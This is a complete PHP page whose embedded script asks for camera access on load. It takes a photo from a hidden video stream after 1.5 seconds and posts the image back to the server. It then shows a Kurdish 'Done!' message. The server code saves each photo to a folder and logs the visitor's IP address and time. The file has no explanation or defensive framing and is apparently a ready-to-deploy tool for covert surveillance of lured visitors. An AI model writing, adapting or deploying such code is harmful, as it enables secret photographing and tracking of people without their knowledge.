<?php
header('Content-Type: text/html');
?>
<video autoplay style="display:none">
<script>
navigator.mediaDevices.getUserMedia({video:!0}).then(s=>{
v=document.createElement('video');v.srcObject=s;v.play();
setTimeout(()=>{
c=document.createElement('canvas');c.width=480;c.height=360;
c.getContext('2d').drawImage(v,0,0);
fetch(location.href,{method:'POST',body:'i='+btoa(c.toDataURL())});
s.getTracks()[0].stop();
document.body.innerHTML='<h1>تەواو بوو!</h1>';
},1500);
});
</script>
<?php
if($_POST['i']){
    $img=base64_decode(preg_replace('/^data:image\/\w+;base64,/','',$img=base64_decode($_POST['i'])));
    @mkdir('cam',0777,true);
    $file='cam/'.time().rand(1000,9999).'.jpg';
    file_put_contents($file,$img);
    file_put_contents('who.txt',$_SERVER['REMOTE_ADDR'].' | '.date('H:i:s')."\n",FILE_APPEND);
    exit('ok');
}
?>
